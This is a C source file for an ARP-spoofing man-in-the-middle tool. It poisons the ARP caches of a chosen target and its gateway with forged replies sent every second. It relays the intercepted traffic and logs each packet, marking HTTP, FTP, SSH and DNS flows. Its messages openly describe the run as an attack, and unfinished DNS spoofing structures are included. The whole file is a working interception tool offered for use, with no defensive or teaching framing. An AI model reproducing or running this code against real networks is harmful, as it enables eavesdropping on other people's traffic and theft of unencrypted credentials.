#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <netinet/ether.h>
#include <linux/if_arp.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <errno.h>
#include <ctype.h>

#define DNS_PORT 53
#define DNS_HEADER_SIZE 12

#define DNS_QUERY 0
#define DNS_ANSWER 1
#define DNS_TYPE_A 1

#define PACKET_BUFFER_SIZE 65535
#define HTTP_BUFFER_SIZE 8192
#define MAX_URL_LENGTH 2048

#define ARP_REQUEST 1
#define ARP_REPLY 2

#define PACKET_BUFFER_SIZE 65535
#define HTTP_BUFFER_SIZE 8192
#define MAX_URL_LENGTH 2048

volatile int keep_running = 1;
unsigned long packets_sent = 0;
unsigned long packets_forwarded = 0;
unsigned long packets_captured = 0;
unsigned long http_requests_captured = 0;

unsigned char our_mac[6];
unsigned char target_mac[6];
unsigned char gateway_mac[6];
unsigned char target_ip[4];
unsigned char gateway_ip[4];
char *interface;

int raw_socket;

typedef struct arp_header {
    unsigned short hardware_type;
    unsigned short protocol_type;
    unsigned char hardware_size;
    unsigned char protocol_size;
    unsigned short opcode;
    unsigned char sender_mac[6];
    unsigned char sender_ip[4];
    unsigned char target_mac[6];
    unsigned char target_ip[4];
} __attribute__((packed)) arp_header;

typedef struct ethernet_header {
    unsigned char dest_mac[6];
    unsigned char src_mac[6];
    unsigned short ether_type;
} __attribute__((packed)) ethernet_header;

typedef struct arp_packet {
    ethernet_header eth;
    arp_header arp;
} __attribute__((packed)) arp_packet;


// workin on them currently
typedef struct dns_header {
    unsigned short id;
    unsigned short qr;
    unsigned short opcode;
    unsigned short aa;
    unsigned short tc;
    unsigned short rd;
    unsigned short ra;
    unsigned short z;
    unsigned short rcode;
    unsigned short qdcount;
    unsigned short ancount;
    unsigned short nscount;
    unsigned short arcount;
} __attribute__((packed)) dns_header;

typedef struct dns_question {
    unsigned short qtype; // shoud be 1 here since we need only A records
    unsigned short qclass;
    unsigned char* qname; // can be of variable length
} __attribute__((packed)) dns_question;

typedef struct dns_answer {
    unsigned short atype;
    unsigned short aclass;
    unsigned int ttl;
    unsigned short rdlength;
    unsigned char *rdata;
    unsigned char *aname;
} __attribute__((packed)) dns_answer;

typedef struct dns_packet {
    dns_header header;
    dns_question question;
   dns_answer answer;
} dns_packet;

void handle_sigint(int sig) {
    printf("\n\nAttack terminated. Statistics:\n");
    printf("ARP packets sent: %lu\n", packets_sent);
    printf("Packets forwarded: %lu\n", packets_forwarded);
    printf("Packets captured: %lu\n", packets_captured);
    printf("HTTP requests captured: %lu\n", http_requests_captured);
    keep_running = 0;
}

int get_if_mac(const char *ifname, unsigned char *mac) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    
    if (sock < 0) {
        perror("socket");
        return -1;
    }
    
    strcpy(ifr.ifr_name, ifname);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl SIOCGIFHWADDR");
        close(sock);
        return -1;
    }
    
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    close(sock);
    return 0;
}

int get_if_index(const char *ifname) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    
    if (sock < 0) {
        perror("socket");
        return -1;
    }
    
    strcpy(ifr.ifr_name, ifname);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl SIOCGIFINDEX");
        close(sock);
        return -1;
    }
    
    close(sock);
    return ifr.ifr_ifindex;
}

int get_mac_from_ip(int sock, const char *interface, const unsigned char *ip, unsigned char *mac_out) {
    arp_packet request_packet;
    struct sockaddr_ll device;
    unsigned char buffer[PACKET_BUFFER_SIZE];
    fd_set read_fds;
    struct timeval timeout;
    int ret;
    
    memset(&device, 0, sizeof(device));
    device.sll_family = AF_PACKET;
    device.sll_ifindex = get_if_index(interface);
    device.sll_halen = ETH_ALEN;
    
    memset(&request_packet, 0, sizeof(request_packet));
    memset(request_packet.eth.dest_mac, 0xFF, 6);

    memcpy(request_packet.eth.src_mac, our_mac, 6);

    request_packet.eth.ether_type = htons(ETH_P_ARP);
    request_packet.arp.hardware_type = htons(ARPHRD_ETHER);
    request_packet.arp.protocol_type = htons(ETH_P_IP);
    request_packet.arp.hardware_size = 6;
    request_packet.arp.protocol_size = 4;
    request_packet.arp.opcode = htons(ARP_REQUEST);
    
    memcpy(request_packet.arp.sender_mac, our_mac, 6);
    
    struct ifreq ifr;
    int temp_sock = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
    
    if (ioctl(temp_sock, SIOCGIFADDR, &ifr) < 0) {
        perror("ioctl SIOCGIFADDR");
        close(temp_sock);
        return -1;
    }
    
    close(temp_sock);

    memcpy(request_packet.arp.sender_ip, &((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr, 4);
    memset(request_packet.arp.target_mac, 0, 6);
    memcpy(request_packet.arp.target_ip, ip, 4);
    memset(device.sll_addr, 0xFF, 6);

    if (sendto(sock, &request_packet, sizeof(request_packet), 0, 
               (struct sockaddr*)&device, sizeof(device)) < 0) {
        perror("sendto");
        return -1;
    }
    
    FD_ZERO(&read_fds);
    FD_SET(sock, &read_fds);
    
    timeout.tv_sec = 2;
    timeout.tv_usec = 0;
    
    ret = select(sock + 1, &read_fds, NULL, NULL, &timeout);
    if (ret <= 0) {
        if (ret == 0)
            fprintf(stderr, "Timeout waiting for ARP reply\n");
        else
            perror("select");
        return -1;
    }
    
    int retry_count = 0;
    while (retry_count < 5) {
        ret = recv(sock, buffer, sizeof(buffer), 0);
        if (ret < 0) {
            perror("recv");
            return -1;
        }
        
        ethernet_header *eth = (ethernet_header *)buffer;
        if (ntohs(eth->ether_type) != ETH_P_ARP) {
            retry_count++;
            continue;
        }
        
        arp_header *arp = (arp_header *)(buffer + sizeof(ethernet_header));
        if (ntohs(arp->opcode) != ARP_REPLY) {
            retry_count++;
            continue;
        }
        
        if (memcmp(arp->sender_ip, ip, 4) != 0) {
            retry_count++;
            continue;
        }
        
        memcpy(mac_out, arp->sender_mac, 6);
        return 0;
    }
    
    return -1;
}

void send_arp_spoof(int sock, const unsigned char *victim_mac, const unsigned char *victim_ip, const unsigned char *spoof_ip) {
    arp_packet spoof_packet;
    struct sockaddr_ll device;
    
    memset(&device, 0, sizeof(device));

    device.sll_family = AF_PACKET;
    device.sll_ifindex = get_if_index(interface);
    device.sll_halen = ETH_ALEN;

    memcpy(device.sll_addr, victim_mac, 6);
    memset(&spoof_packet, 0, sizeof(spoof_packet));
    memcpy(spoof_packet.eth.dest_mac, victim_mac, 6);
    memcpy(spoof_packet.eth.src_mac, our_mac, 6);
    spoof_packet.eth.ether_type = htons(ETH_P_ARP);
    

    spoof_packet.arp.hardware_type = htons(ARPHRD_ETHER);
    spoof_packet.arp.protocol_type = htons(ETH_P_IP);
    spoof_packet.arp.hardware_size = 6;
    spoof_packet.arp.protocol_size = 4;
    spoof_packet.arp.opcode = htons(ARP_REPLY);
    
    memcpy(spoof_packet.arp.sender_mac, our_mac, 6);
    memcpy(spoof_packet.arp.sender_ip, spoof_ip, 4);
    memcpy(spoof_packet.arp.target_mac, victim_mac, 6);
    memcpy(spoof_packet.arp.target_ip, victim_ip, 4);

    if (sendto(sock, &spoof_packet, sizeof(spoof_packet), 0, (struct sockaddr*)&device, sizeof(device)) < 0) {
        perror("sendto");
        return;
    }
    
    packets_sent++;
}

void forward_packet(const unsigned char *buffer, int size, const unsigned char *src_mac, const unsigned char *dest_mac) {
    struct sockaddr_ll device;
    ethernet_header *eth = (ethernet_header *)buffer;
    
    unsigned char *packet = malloc(size);
    if (!packet) {
        perror("malloc");
        return;
    }
    
    memcpy(packet, buffer, size);
    
    eth = (ethernet_header *)packet;
    memcpy(eth->src_mac, src_mac, 6);
    memcpy(eth->dest_mac, dest_mac, 6);
    
    memset(&device, 0, sizeof(device));
    device.sll_family = AF_PACKET;
    device.sll_ifindex = get_if_index(interface);
    device.sll_halen = ETH_ALEN;
    memcpy(device.sll_addr, dest_mac, 6);
    
    if (sendto(raw_socket, packet, size, 0, 
               (struct sockaddr*)&device, sizeof(device)) < 0) {
        perror("sendto in forward_packet");
    } else {
        packets_forwarded++;
    }
    
    free(packet);
}

void print_packet_details(const unsigned char *buffer, int size) {
    ethernet_header *eth = (ethernet_header *)buffer;
    struct iphdr *ip;
    struct tcphdr *tcp;
    struct udphdr *udp;
    int eth_header_size = sizeof(ethernet_header);
    time_t now;
    struct tm *timeinfo;
    char timestamp[80];
    
    time(&now);
    timeinfo = localtime(&now);
    strftime(timestamp, sizeof(timestamp), "%H:%M:%S", timeinfo);
    
    printf("\n[%s] Packet captured (#%lu):\n", timestamp, ++packets_captured);
    
    printf("- Ethernet: ");
    printf("Src MAC: ");
    printf("%02X:%02X:%02X:%02X:%02X:%02X", eth->src_mac[0], eth->src_mac[1], eth->src_mac[2], eth->src_mac[3], eth->src_mac[4], eth->src_mac[5]);
    printf(" -> Dst MAC: ");
    printf("%02X:%02X:%02X:%02X:%02X:%02X", eth->dest_mac[0], eth->dest_mac[1], eth->dest_mac[2], eth->dest_mac[3], eth->dest_mac[4], eth->dest_mac[5]);
    
    if (ntohs(eth->ether_type) == ETH_P_IP) {
        ip = (struct iphdr*)(buffer + eth_header_size);
        
        printf("\n- IP: ");
        printf("Src IP: %s", inet_ntoa(*(struct in_addr*)&ip->saddr));
        printf(" -> Dst IP: %s", inet_ntoa(*(struct in_addr*)&ip->daddr));
        printf(" (proto: %d)", ip->protocol);
        
        if (ip->protocol == IPPROTO_TCP) {
            tcp = (struct tcphdr*)(buffer + eth_header_size + (ip->ihl * 4));
            
            printf("\n- TCP: ");
            printf("Src Port: %d", ntohs(tcp->source));
            printf(" -> Dst Port: %d", ntohs(tcp->dest));
            
            printf(" [Flags: ");
            if (tcp->syn) printf("SYN ");
            if (tcp->ack) printf("ACK ");
            if (tcp->fin) printf("FIN ");
            if (tcp->rst) printf("RST ");
            if (tcp->psh) printf("PSH ");
            if (tcp->urg) printf("URG ");
            printf("]");
            
            if (ntohs(tcp->dest) == 80 || ntohs(tcp->source) == 80) {
                printf(" (HTTP)");
            } else if (ntohs(tcp->dest) == 443 || ntohs(tcp->source) == 443) {
                printf(" (HTTPS - encrypted)");
            } else if (ntohs(tcp->dest) == 22 || ntohs(tcp->source) == 22) {
                printf(" (SSH)");
            } else if (ntohs(tcp->dest) == 21 || ntohs(tcp->source) == 21) {
                printf(" (FTP)");
            }
        } else if (ip->protocol == IPPROTO_UDP) {
            udp = (struct udphdr*)(buffer + eth_header_size + (ip->ihl * 4));
            
            printf("\n- UDP: ");
            printf("Src Port: %d", ntohs(udp->source));
            printf(" -> Dst Port: %d", ntohs(udp->dest));
            
            if (ntohs(udp->dest) == 53 || ntohs(udp->source) == 53) {
                printf(" (DNS)");
                
            } else if (ntohs(udp->dest) == 67 || ntohs(udp->dest) == 68) {
                printf(" (DHCP)");
            }
        } else if (ip->protocol == IPPROTO_ICMP) {
            printf("\n- ICMP packet");
        }
    } else if (ntohs(eth->ether_type) == ETH_P_ARP) {
        printf("\n- ARP packet");
    } else {
        printf("\n- Other protocol (type: 0x%04x)", ntohs(eth->ether_type));
    }
    
    printf("\n- Packet size: %d bytes\n", size);
    printf("----------------------------------------------------");
}

void process_packet(unsigned char *packet, int size) {
    ethernet_header *eth = (ethernet_header *)packet;
    
    if (ntohs(eth->ether_type) != ETH_P_IP) {
        return;
    }
    
    if (memcmp(eth->src_mac, target_mac, 6) == 0 && memcmp(eth->dest_mac, our_mac, 6) == 0) {
        print_packet_details(packet, size);
        forward_packet(packet, size, our_mac, gateway_mac);
    } else if (memcmp(eth->src_mac, gateway_mac, 6) == 0 && memcmp(eth->dest_mac, our_mac, 6) == 0) {
        print_packet_details(packet, size);
        forward_packet(packet, size, our_mac, target_mac);
    }
}

void *arp_spoof_thread(void *arg) {
    while (keep_running) {
        send_arp_spoof(raw_socket, target_mac, target_ip, gateway_ip);
        send_arp_spoof(raw_socket, gateway_mac, gateway_ip, target_ip);
        usleep(1000000);
    }
    
    return NULL;
}

void *packet_capture_thread(void *arg) {
    int capture_socket;
    unsigned char buffer[PACKET_BUFFER_SIZE];
    int bytes_received;
    
    capture_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (capture_socket < 0) {
        perror("socket for capture");
        return NULL;
    }
    
    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = get_if_index(interface);
    sll.sll_protocol = htons(ETH_P_ALL);
    
    if (bind(capture_socket, (struct sockaddr *)&sll, sizeof(sll)) < 0) {
        perror("bind");
        close(capture_socket);
        return NULL;
    }
    
    int flags = fcntl(capture_socket, F_GETFL, 0);
    fcntl(capture_socket, F_SETFL, flags | O_NONBLOCK);
    
    printf("Listening for packets...\n");
    printf("----------------------------------------------------\n");
    
    while (keep_running) {
        bytes_received = recv(capture_socket, buffer, sizeof(buffer), 0);
        if (bytes_received > 0) {
            process_packet(buffer, bytes_received);
        } else if (bytes_received < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
            perror("recv in capture thread");
            break;
        }
        
        usleep(1000);
    }
    
    close(capture_socket);
    return NULL;
}

void clean_up(unsigned char *target_mac, unsigned char *gateway_mac) {
    printf("Restoring ARP tables...\n");
    arp_packet restore_packet;
    struct sockaddr_ll device;

    memset(&device, 0, sizeof(device));
    device.sll_family = AF_PACKET;
    device.sll_ifindex = get_if_index(interface);
    device.sll_halen = ETH_ALEN;
    memcpy(device.sll_addr, target_mac, 6);

    memset(&restore_packet, 0, sizeof(restore_packet));
    memset(&restore_packet.eth.dest_mac, target_mac, 6);
    memcpy(restore_packet.eth.src_mac, gateway_mac, 6);

    restore_packet.eth.ether_type = htons(ETH_P_ARP);
    restore_packet.arp.hardware_type = htons(ARPHRD_ETHER);
    restore_packet.arp.protocol_type = htons(ETH_P_IP);
    restore_packet.arp.hardware_size = 6;
    restore_packet.arp.protocol_size = 4;
    restore_packet.arp.opcode = htons(ARP_REPLY);

    memcpy(restore_packet.arp.sender_mac, gateway_mac, 6);
    memcpy(restore_packet.arp.sender_ip, gateway_ip, 4);
    memcpy(restore_packet.arp.target_mac, target_mac, 6);
    memcpy(restore_packet.arp.target_ip, target_ip, 4);

    if (sendto(raw_socket, &restore_packet, sizeof(restore_packet), 0, (struct sockaddr*)&device, sizeof(device)) < 0) perror("sendto");
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <interface> <target_ip> <gateway_ip>\n", argv[0]);
        printf("Example: %s wlp0s20f3 192.168.1.44 192.168.1.1\n", argv[0]);
        return 1;
    }
    
    interface = argv[1];
    char *target_ip_str = argv[2];
    char *gateway_ip_str = argv[3];
    
    if (inet_pton(AF_INET, target_ip_str, target_ip) != 1) {
        fprintf(stderr, "Invalid target IP address\n");
        return 1;
    }
    
    if (inet_pton(AF_INET, gateway_ip_str, gateway_ip) != 1) {
        fprintf(stderr, "Invalid gateway IP address\n");
        return 1;
    }
    
    signal(SIGINT, handle_sigint);
    
    raw_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (raw_socket < 0) {
        perror("socket");
        return 1;
    }
    
    if (get_if_mac(interface, our_mac) < 0) {
        fprintf(stderr, "Failed to get MAC address for %s\n", interface);
        close(raw_socket);
        return 1;
    }
    
    printf("Attacker's MAC address: ");
    printf("%02X:%02X:%02X:%02X:%02X:%02X", our_mac[0], our_mac[1], our_mac[2], our_mac[3], our_mac[4], our_mac[5]);
    printf("\n");

    printf("Resolving target MAC address...\n");
    if (get_mac_from_ip(raw_socket, interface, target_ip, target_mac) < 0) {
        fprintf(stderr, "Failed to get target MAC address. Exiting.\n");
        close(raw_socket);
        return 1;
    }
    printf("Target MAC address: ");
    printf("%02X:%02X:%02X:%02X:%02X:%02X", target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5]);
    printf("\n");
    
    printf("Resolving gateway MAC address...\n");
    if (get_mac_from_ip(raw_socket, interface, gateway_ip, gateway_mac) < 0) {
        fprintf(stderr, "Failed to get gateway MAC address. Exiting.\n");
        close(raw_socket);
        return 1;
    }
    printf("Gateway MAC address: ");
    printf("%02X:%02X:%02X:%02X:%02X:%02X", gateway_mac[0], gateway_mac[1], gateway_mac[2], gateway_mac[3], gateway_mac[4], gateway_mac[5]);
    printf("\n");
    
    pthread_t spoof_thread;
    if (pthread_create(&spoof_thread, NULL, arp_spoof_thread, NULL) != 0) {
        perror("pthread_create for ARP spoofing");
        close(raw_socket);
        return 1;
    }
    
    pthread_t capture_thread;
    if (pthread_create(&capture_thread, NULL, packet_capture_thread, NULL) != 0) {
        perror("pthread_create for packet capture");
        keep_running = 0;
        pthread_join(spoof_thread, NULL);
        close(raw_socket);
        return 1;
    }
    
    printf("\nStarting attack...\n");
    printf("ARP spoofing active: Redirecting traffic between ");
    printf("%d.%d.%d.%d", target_ip[0], target_ip[1], target_ip[2], target_ip[3]);
    printf(" and ");
    printf("%d.%d.%d.%d", gateway_ip[0], gateway_ip[1], gateway_ip[2], gateway_ip[3]);
    printf("\n");
    printf("\nPress Ctrl+C to stop the attack\n");
    
    pthread_join(spoof_thread, NULL);
    pthread_join(capture_thread, NULL);
    clean_up(target_mac, gateway_mac);
    close(raw_socket);
    printf("Attack terminated.\n");
    
    return 0;
}